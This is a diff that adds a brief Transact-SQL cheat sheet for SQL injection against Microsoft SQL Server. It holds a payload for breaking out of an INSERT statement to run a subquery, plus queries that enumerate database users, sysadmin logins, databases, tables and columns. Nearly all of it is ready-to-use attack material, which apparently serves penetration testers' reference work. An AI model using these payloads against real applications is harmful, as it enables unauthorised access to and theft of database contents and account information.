@@ -1,0 +1,23 @@
+---
+syntax: transact-sql
+---
+-- SQL injection in insert query
+-- * break out and insert result of sub query
+-- * beware of possible length restriction
+'+(select ...)+'
+
+-- Useful queries
+-- * get current database user
+select user_name()
+-- * get all database users
+select string_agg(name, ',') from master..syslogins
+-- * get all users with sysadmin permission
+select string_agg(name, ',') from master..syslogins where sysadmin = 1
+-- * get current database
+select db_name()
+-- * get all databases
+select string_agg(name, ',') from master..sysdatabases
+-- * get tables of database
+select string_agg(name, ',') from DB..sysobjects where xtype = 'U'
+-- * get columns of table
+select string_agg(name, ',') from syscolumns where id = (select id from sysobjects where name = 'TABLE')
